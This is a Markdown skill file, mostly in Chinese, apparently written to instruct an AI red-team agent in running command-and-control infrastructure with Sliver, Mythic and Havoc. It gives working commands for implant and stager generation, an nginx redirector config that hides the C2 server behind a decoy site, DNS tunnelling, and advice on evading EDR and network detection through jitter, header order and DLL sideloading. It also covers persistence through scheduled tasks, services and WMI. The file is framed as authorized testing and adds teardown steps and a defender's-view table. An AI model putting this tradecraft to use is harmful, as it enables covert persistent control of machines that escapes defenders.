---
name: c2-framework-ops
description: Use for authorized C2 infrastructure operations — implant selection, redirector and CDN fronting, malleable profiles, sleep/jitter tuning, and teardown. Covers Sliver/Mythic/Havoc plus Cobalt Strike concepts.
whenToUse: Use when you need a persistent control channel (not a one-shot reverse shell) — after initial access, when you need multiple agents, task queuing, or traffic that survives egress filtering.
source: dsh-purge original（按本仓模板撰写）
---

# C2 框架运维（完整工具链）

**这套技能解决的是"有 shell 之后怎么办"**：一次性反弹 shell 会断、会挂、无法同时控制多台、
也无法在出网受限的环境存活。C2 框架解决全部四个问题。

**与 `vps-reverse-shell` / `shell-handler` 的分界**：
- 那两技能给你**一次性的** shell（拿证据、验证漏洞够了）；
- 本技能给**持续控制**（多目标、可任务下发、可存活重启、可流量伪装）。

判断标准很简单：**"我需要过一会儿再回来操作它吗？"** 要 → 上 C2。

## 适用场景

- 已拿到初始 access，需要持续控制与横向跳板
- 目标有出口过滤（只能走 443/80/DNS），需要流量伪装
- 需要同时控制多台（团队协作 / 大批量目标）
- 需要"重启后还在"的持久通道（C2 的 session 短，implant 的 beacon 长）
- 演练要求"完整攻击链"，必须有 C2 环节

**不在本技能范围**：单个反弹 shell（见 `shell-handler`）、隧道工具（见 `suo5-tunnel`/`chisel-tunnel`）。

## 一、先选框架（不是"哪个强"，是"哪个适配你的约束"）

| 框架 | 语言 | 部署成本 | 流量伪装能力 | 团队协作 | 适用 |
| --- | --- | --- | --- | --- | --- |
| **Sliver** | Go | 低（单二进制） | **强**（mTLS/HTTP/DNS/WireGuard，可自定义） | 中（multiplayer mode） | **首选**：开源、单文件、Armory 扩展生态 |
| **Mythic** | Python + Docker | 中（Docker Compose） | 强（可插拔 C2 profile） | **强**（Web UI + 多 operator） | 需要多人协作 / 多 agent 类型 |
| **Havoc** | C/Go | 中 | 强（Demon agent 高度可配） | 弱（单人为主） | 需要 Windows 免杀强定制 |
| Cobalt Strike | Java | 高（商业授权） | 强（Malleable C2 profile） | **强** | 有授权且有预算；概念可迁移 |
| AdaptixC2 | Go | 低 | 中 | 中 | Kali 新收录，快速部署 |

**判据（选框架的唯一硬标准）**：**你的 implant 需要活多久、要过什么过滤**。
- 短（几小时）+ 无过滤 → Sliver 默认配置够
- 长（几天）+ 有出口过滤 → 必须配 redirector + 自定义 profile（任何框架都要）
- 多人协作 → Mythic（否则同步状态会很痛苦）

## 二、基础设施：redirector 是必需品，不是可选项

**直连 C2 服务器是最常见的失败原因**：implant 的回连 IP 一旦暴露，
防守方封 IP 就全断，而且这个 IP 会进威胁情报。

### 标准三层架构

```text
implant ──→ redirector（公网 IP，可换）──→ C2 server（不直接暴露）
         ↑
    域名（可轮换）
```

```text
第一层：域名
  · 用「看起来正常」的域名（不要 rand12345.xyz）
  · 一个域名对应一个 redirector；封了换域名不换服务器

第二层：redirector（VPS）
  · 只做转发，不存任何东西（被封了损失最小）
  · 按 UA / URI / 时间窗过滤：只有 implant 的特征才转发到 C2
  · 非 implant 流量 → 转发到一个「正常的假网站」（这是关键）

第三层：C2 server（内网或另一台 VPS）
  · 只接受 redirector 的连接（白名单来源 IP）
  · 不在任何地方直接暴露
```

### redirector 的最小可用配置（nginx 反代 + 过滤）

```nginx
# 只在 UA 匹配时才转发到真实 C2；其他流量去假站
server {
    listen 443 ssl http2;
    server_name cdn.your-domain.com;

    ssl_certificate     /etc/letsencrypt/live/cdn.your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.your-domain.com/privkey.pem;

    # ① implant 的特征（UA + 特定 URI）
    location /api/v1/updates {
        if ($http_user_agent !~* "Mozilla/5.0 \(Windows NT 10.0; Win64; x64\) AppleWebKit") {
            return 302 https://www.microsoft.com;   # ← 不匹配就去真实网站
        }
        proxy_pass https://C2_REAL_IP:443;
        proxy_set_header Host $host;
        proxy_ssl_verify off;
        # 长连接（C2 的 beacon 需要）
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }

    # ② 其他所有请求 → 假站（让扫描器/蓝队看到"正常"内容）
    location / {
        root /var/www/decoy;
        index index.html;
    }
}
```

**判据（这一步最容易漏）**：**redirector 上不许有 C2 的任何特征**。
不能有 C2 的 banner、不能有管理端口、不能有任何指向 C2 的文档。
被封后换一个 redirector，implant 只改域名即可。

## 三、流量伪装：profile 决定能不能活过 EDR

### 核心概念

```text
beacon 的流量特征由 profile 决定：
  · URI 路径（像不像正常 API）
  · Header 顺序与取值（像不像真浏览器）
  · 请求体编码（base64 / 自定义）
  · 心跳间隔与抖动（像不像人在用）
```

**判据**：**默认 profile 一定被识别**。所有框架的默认 profile 都进了公开的检测规则
（Sigma / YARA / 各厂商的 C2 检测）。上线前必须自定义。

### Sliver 的 profile（HTTP C2）

```bash
# 生成一个伪装成「CDN 心跳」的 profile
sliver > profiles new --profile-name cdn-beacon --format shellcode http

# 关键参数：
#   --http-c2-url          https://cdn.your-domain.com/api/v1/updates
#   --http-c2-interval     60s      ← 心跳（默认 60s，太短会被周期检测抓）
#   --http-c2-jitter       30       ← 抖动 30%（必须有，固定间隔是最大特征）
#   --http-c2-user-agent   Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
```

```text
自定义 profile 的三条硬要求：
1) **心跳间隔 ≥ 60s + 抖动 30% 以上**
   固定 5s 间隔 = 教科书式 C2 特征。真人的操作有停顿。
2) **URI 必须像业务路由**
   /api/v1/updates ✓   /beacon ✗   /gate.php ✗
3) **Header 顺序跟真浏览器一致**
   Chrome: Host → Connection → sec-ch-ua → ... → Accept → User-Agent
   （顺序不对是 JA3/JA4 指纹之外的另一个强特征）
```

### DNS 隧道（出口只放 DNS 时）

```bash
# Sliver 的 DNS C2：走 53 端口，几乎任何网络都放行
sliver > profiles new --profile-name dns-c2 --format shellcode dns \
  --dns-c2-domains cdn.your-domain.com \
  --dns-c2-canary cdn-backup.your-domain.com   # 备用域，主域被封时切
```

**判据**：DNS C2 的**检测点是 DNS 查询频率与子域长度**。
- 频率：正常 DNS 有缓存，同一域不会高频查；C2 是持续查询
- 子域熵：base64 编码的子域熵很高（`aGVsbG8ud29ybGQ.cdn...` 一眼可疑）
- 判据：**必须限制单次查询的数据量**（每次 ≤ 200 字节），让频率看起来像正常解析

## 四、implant 生成与投放

### Sliver 的完整流程

```bash
# ① 启动服务器（在 C2 server 上，不是 redirector）
sliver-server

# ② 生成 implant（Windows x64，走 HTTPS C2）
sliver > generate --mtls cdn.your-domain.com:443 \
  --os windows --arch amd64 \
  --save /tmp/implant.exe

# ③ 或用 profile（推荐，特征更可控）
sliver > profiles new --profile-name cdn-beacon --format shellcode http
sliver > stage-listener --url https://cdn.your-domain.com/api/v1/updates \
  --profile cdn-beacon --prepend-size
sliver > generate stager --lhost cdn.your-domain.com --lport 443 \
  --protocol https --save /tmp/stager.exe
```

### 三种投放形态（按目标环境选）

| 形态 | 优点 | 缺点 | 什么时候用 |
| --- | --- | --- | --- |
| **直接 exe** | 最简单 | 落到磁盘，EDR 会扫 | 目标没有 EDR / 有授权关防护 |
| **shellcode stager** | 不落盘（内存执行） | 需要加载器 | 有 EDR |
| **DLL sideload** | 复用合法进程（信誉高） | 需要找一个可劫持的 DLL | 有严格白名单 |

```bash
# DLL sideload 的思路（最隐蔽）
# 找一个会加载同目录 DLL 的合法程序（如某输入法、某更新器），
# 把你的 DLL 命名成它要加载的名字，放同目录。
# 判据：程序启动 → 加载你的 DLL → 你的 DLL 起 C2，合法程序照常工作
```

**验伤（implant 是否真上线）**：

```bash
# ① 在 C2 上看 session 列表（唯一判据）
sliver > sessions
# 判据：出现目标主机名 + 正确的用户名 + 正确的 OS 版本

# ② 发一条命令看回显
sliver > use <session-id>
sliver (IMPLANT) > whoami
# 判据：回显是目标的真实用户名，不是"无法执行"

# ③ 确认心跳（过几分钟再看）
sliver > sessions
# 判据：LastCheckin 在更新 = 心跳正常；时间不更新 = 只上线了一次（stager 已死）
```

**三类假成功**：

1. **stager 上线了但没有 session** —— shellcode 拿到了，但没有正确回连（profile 配错）。
2. **session 出现但命令超时** —— 网络通但 implant 的 shell 有问题（常见于受限 token）。
3. **session 活着但每次命令要走 60s** —— 心跳间隔太长。改 profile 或临时发 `checkin` 强制。

## 五、团队协作与任务下发

```bash
# ── Sliver 的 multiplayer（多 operator 共享 session）──
sliver-server daemon          # 以 daemon 模式跑
sliver-client console         # 每个 operator 连上去
# 判据：sessions 列表是共享的，但命令历史各看各的

# ── Mythic（Web UI，天然多人）──
# 每个 operator 一个账号；payload 与 callback 全局共享
# 判据：Web UI 上能看到"谁在什么时候对哪个 agent 发了什么命令"（这是审计，也是协作）
```

**判据（团队协作的核心问题）**：**谁在什么时候对哪台机器做了什么**。
这不是"nice to have" —— 演练报告要做时间线，C2 的命令历史就是最可靠的时间线来源。
所以**必须用支持操作审计的框架**（Mythic 天然有，Sliver 的 multiplayer 有日志但较弱）。

## 六、持久化（implant 死掉之后怎么办）

C2 的 session 会断（重启/网络切换/被杀）。所以必须有"重新上线"的机制：

| 机制 | 实现 | 存活能力 | 检测风险 |
| --- | --- | --- | --- |
| 计划任务 | `schtasks /create` 每小时跑 implant | 重启后仍在 | 中（7045/4698 事件） |
| 服务 | `sc create` + auto start | 重启后仍在 | 中（7045） |
| 注册表 Run | `HKCU\...\Run` | 登录后启动 | **高**（Autoruns 一眼看到） |
| WMI 订阅 | `__EventFilter` + Consumer | 重启后仍在 | 低（但 WMI 审计会抓） |
| 内存马（不落盘） | 注入合法进程 | 重启即失 | 低 |

**判据**：**持久化只做一处**。做两处以上，任何一处被发现都会暴露全部。
优先选「低检测风险 + 能在报告里说清」的（WMI 订阅或计划任务）。

> 详细的持久化手法见 `privesc-persistence` 与 `references/host-persistence-tradecraft.md`。
> 本技能只讲「C2 相关的持久化」（= 让 implant 重新上线），不重复通用持久化。

## 七、收尾（演练结束必做，不是可选）

```text
□ 停掉所有 implant（`kill` 所有 session / 卸载持久化）
□ 删掉持久化（计划任务、服务、注册表、WMI 订阅）—— **逐个确认删掉了**
□ 关掉 C2 server 与 redirector（VPS 释放）
□ 吊销域名与证书
□ 如果目标环境里有你放的文件，清理掉
□ **把 C2 的命令历史导出**（这是报告的时间线来源）
```

**为什么收尾必须做**：
1. 留在那儿的 implant 是**真实的安全隐患**（不是演练道具）—— 如果对方安全团队后来发现了，
   会变成一起真实事件。
2. 没清理的 C2 基础设施（域名/VPS）会被威胁情报标记，影响你下次演练（同一域名/IP 直接被封）。
3. 报告需要时间线，命令历史只有导出才有。

## 八、工具链（完整体）

| 环节 | 工具 | 用途 |
| --- | --- | --- |
| C2 服务端 | **Sliver**（首选）/ Mythic / Havoc | implant 管理、任务下发 |
| Redirector | nginx / HAProxy / Caddy | 流量转发 + 过滤 |
| 域名/证书 | Let's Encrypt + 云厂商 | 伪装成正常站点 |
| Profile 定制 | 框架自带（Sliver profiles / Malleable C2） | 流量特征控制 |
| Implant 生成 | Sliver `generate` / Mythic payload / msfvenom | 生成各平台 implant |
| 加载器 | 自写（C#/Go shellcode loader） | 内存执行，绕 EDR |
| DLL 劫持 | Process Monitor + 手工找 | sideload 侧载 |
| 任务编排 | 框架自带 / 自己写 API 脚本 | 批量下发 |
| 流量验证 | `tshark` / `curl` 对比 | 确认 profile 真的像正常流量 |

## 参考（深水区，按需加载）

- `references/c2-infra-playbook.md` —— redirector 三种架构、域名与证书轮换、
  profile 的具体参数调优、以及**为什么默认 profile 必被识别**的实测对比。
- `references/c2-traffic-analysis.md` —— 从防守方视角看 C2 流量：
  哪些特征会被抓（JA3/JA4、心跳周期、URI 熵、DNS 子域），据此反推怎么改 profile。
- `references/implant-loader-dev.md` —— shellcode 加载器的构造（C#/Go）、
  ETW/AMSI 绕过、以及 DLL sideload 的完整流程。

**什么时候翻哪个**：
- 搭基础设施 → `c2-infra-playbook.md`
- profile 被识别了 → `c2-traffic-analysis.md`（先知道被抓什么，再改）
- implant 被杀 → `implant-loader-dev.md`

## 落库要求

- `redteam_chain_add`：`stage_code=internal`（C2 通常在拿到内网入口后），
  `tool` 写框架名 + profile 名（`Sliver / cdn-beacon`），**不要写 redirector 的真实 IP**。
- session 数按「上线主机数」记，不要按「命令执行成功数」记（后者会虚高）。
- **收尾记录必进库**：清理了哪些持久化、什么时候停的、命令历史导出到哪。

## 任务完成自检

- [ ] 用了 redirector（不是直连 C2）？
- [ ] profile 是自定义的（心跳 ≥60s + 抖动 ≥30% + URI 像业务路由）？
- [ ] implant 上线后发过命令确认能执行（不是只看 session 列表）？
- [ ] 持久化只做了一处？
- [ ] 演练结束清理了全部 implant + 持久化 + 基础设施？
- [ ] 导出了命令历史（报告时间线）？

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 资源开发 | T1583 | Acquire Infrastructure（域名/VPS） |
| 资源开发 | T1587 | 开发能力（implant / 加载器） |
| 资源开发 | T1583 | 获取基础设施（redirector / 投递点） |
| 命令与控制 | T1071 | Application Layer Protocol（HTTP/HTTPS C2） |
| 命令与控制 | T1071 | 应用层协议（DNS 隧道也走这条） |
| 命令与控制 | T1571 | 非标准端口（避开只放 443 的出口策略） |
| 命令与控制 | T1090 | 代理（redirector） |
| 命令与控制 | T1008 | 备用信道（备用域 / fallback） |
| 命令与控制 | T1105 | 入站工具传输（下发后续工具） |
| 持久化 | T1053 | 计划任务 |
| 持久化 | T1543 | 创建或修改系统进程（服务） |
| 隐匿 | T1055 | 进程注入（内存加载） |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。

## 检测视角（防守方在日志里看到什么）

| 动作 | 防守方看哪里 | 典型信号 |
| --- | --- | --- |
| beacon 心跳 | 代理 / 防火墙 / NDR | **固定周期**的 HTTPS 请求（同 URI、同大小、同间隔）；JA3/JA4 指纹不是常见浏览器 |
| DNS C2 | DNS 日志 | 同一父域的高频查询；子域 base64 熵高；TXT 记录查询异常多 |
| redirector | 威胁情报 | 新域名 + 云 VPS IP + Let's Encrypt 证书（这是标准组合，会被打标签） |
| implant 落盘 | EDR | 未签名 exe；从 Temp/Downloads 执行；父进程异常 |
| 内存执行 | EDR / Sysmon 8/10 | 合法进程（如 rundll32）发起对外连接；进程内存有 RWX 段 |
| DLL sideload | EDR | 合法程序加载了未签名 DLL；DLL 路径不在 System32 |
| 持久化 | 7045 / 4698 / Autoruns | 新服务/新计划任务；WMI 订阅创建（Sysmon 19/20/21） |

**实用推论**：**C2 的检测核心是「周期性 + 指纹」两件事**。
- 周期性：真人的操作有停顿，机器的心跳是固定间隔。所以**抖动是唯一有效的规避手段**。
- 指纹：TLS 指纹（JA3/JA4）比内容更能暴露。所以 profile 改得再好，TLS 库不对一样被抓。
  这条也决定了：**用 Go 写的 Sliver 和用 Java 写的 CS，TLS 指纹天然不同**，
  选框架时要考虑这个（目标环境的 EDR 对哪种指纹更敏感）。

## 第二发（主力打不出去时，按这个顺序换）

1. **HTTP C2 被拦**（出口过滤只放特定端口）：转 DNS C2 或走 `suo5-tunnel` 的隧道
2. **implant 被杀**（EDR 拦）：转 `implant-loader-dev.md` 的加载器方案，或转 `edr-bypass-re`
3. **redirector 被封**：换域名（不换服务器），implant 只改域名重投
4. **根本没有出网**（纯内网）：C2 不可用，转 `chisel-tunnel` / `frp-tunnel` 找能出网的中转
5. **只需要一次性命令**：不必上 C2，转 `shell-handler`（更轻、更不留痕）

**纪律**：implant 连不上时，**先确认是不是 redirector 的问题**（用 curl 从外部试），
不要在 implant 侧反复重投 —— 每投一次都在训练对方的检测。

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

（此节由 `scripts/inject-runnability.mjs` 生成，见文件末尾）

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

（此节由 `scripts/build-skill-graph.mjs` 生成，见文件末尾）

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：5 内网渗透｜**角色**：`internal`
- **上游**（先做完这些再进来）：`shell-handler`、`vps-reverse-shell`、`edr-bypass-re`
- **下游**（产出交给谁）：`lateral-movement`、`credential-attack`、`suo5-tunnel`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`access` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_sessions`（同上：判断现在能往哪走，别凭记忆）

<!-- /skill-link-graph -->

<!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->

## 本机可执行性（自动探测；命令是按 Linux/Kali 写的，照抄会撞空）

本技能命令用到的工具里，本机（PATH 与 toolkit 双探）没有：`msfvenom`、`yara`
- `msfvenom`：本机无、也无已验证替代——先确认它是否必要，必要时找官方 Windows 构建
- `yara`：Windows 有官方二进制（`yara-<ver>-win64.zip`）；只做规则**语法检查**时也可 `python -m pip install yara-python`

runnability:end -->
